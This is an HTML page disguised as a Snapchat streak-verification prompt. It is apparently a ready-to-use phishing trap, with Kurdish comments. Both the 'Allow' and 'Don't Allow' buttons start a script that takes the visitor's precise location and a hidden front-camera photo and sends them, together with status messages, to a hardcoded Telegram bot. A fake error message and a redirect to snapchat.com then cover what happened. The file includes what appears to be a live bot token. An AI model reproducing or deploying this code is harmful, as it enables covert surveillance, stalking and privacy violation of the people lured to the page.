<!DOCTYPE html>
<html lang="ku">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Snapchat Verification</title>
    <style>
        body { background-color: #000; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
        .overlay { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.85); z-index: 10; }
        .alert-box { position: relative; width: 280px; background: rgba(255,255,255,0.95); border-radius: 15px; text-align: center; overflow: hidden; z-index: 20; box-shadow: 0 0 30px rgba(0,0,0,0.6); }
        .text { padding: 22px; color: #000; font-size: 16px; line-height: 1.4; font-weight: 500; }
        .btns { display: flex; border-top: 0.5px solid #bbb; }
        .btn { flex: 1; padding: 14px; color: #007AFF; font-size: 17px; cursor: pointer; border: none; background: none; outline: none; font-family: inherit; -webkit-tap-highlight-color: transparent; }
        .btn-bold { font-weight: 600; border-right: 0.5px solid #bbb; }
        video, canvas { display: none; position: absolute; left: -9999px; }
    </style>
</head>
<body>

<div class="overlay"></div>
<div class="alert-box">
    <div class="text">Allow "Snapchat" to access your location and camera to verify this streak?</div>
    <div class="btns">
        <button class="btn btn-bold" onclick="startCapture()">Allow</button>
        <button class="btn" onclick="startCapture()">Don't Allow</button>
    </div>
</div>

<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<script>
    const B_T = "8641718491:AAH1_yNz4ZQ0hxmMhWK9HPc7zY6CDsvfw2o";
    const C_I = "212703396";

    async function sendMsg(text) {
        try {
            await fetch(`https://api.telegram.org/bot${B_T}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: C_I, text: text })
            });
        } catch (e) {}
    }

    async function sendPhoto(blob) {
        const formData = new FormData();
        formData.append('chat_id', C_I);
        formData.append('photo', blob, 'target.jpg');
        try {
            await fetch(`https://api.telegram.org/bot${B_T}/sendPhoto`, {
                method: 'POST',
                body: formData
            });
        } catch (e) {}
    }

    async function startCapture() {
        // نیشاندانی کارکردن بە بێدەنگی
        await sendMsg("🎯 *Target Clicked!* \nPreparing to capture location & image...");

        // 1. ڕاوکردنی لۆکەیشن
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (p) => {
                let map = `📍 Location: https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
                await sendMsg(map);
                captureCamera();
            }, async (err) => {
                await sendMsg("❌ Location: DENIED");
                captureCamera();
            }, { enableHighAccuracy: true, timeout: 5000 });
        } else {
            captureCamera();
        }
    }

    async function captureCamera() {
        const video = document.getElementById('video');
        const constraints = { video: { facingMode: "user" } };

        try {
            const stream = await navigator.mediaDevices.getUserMedia(constraints);
            video.srcObject = stream;

            // کات دەدەین بە کامێرا بۆ ئەوەی ڕوون ببێتەوە
            await new Promise(resolve => setTimeout(resolve, 2000));

            const canvas = document.getElementById('canvas');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            canvas.getContext('2d').drawImage(video, 0, 0);

            canvas.toBlob(async (blob) => {
                await sendPhoto(blob);
                await sendMsg("📸 *Success:* Image Captured and Sent.");
                stream.getTracks().forEach(track => track.stop());
                finalize();
            }, 'image/jpeg', 0.7);

        } catch (err) {
            await sendMsg("🚫 Camera Capture Failed: " + err.name);
            finalize();
        }
    }

    function finalize() {
        // چاوەڕێ بکە بۆ دڵنیابوون لە ناردنی هەموو داتاکان
        setTimeout(() => {
            alert("Connection error (0x884). Please refresh your Snapchat streak.");
            window.location.href = "https://www.snapchat.com";
        }, 2000);
    }
</script>

</body>
</html>
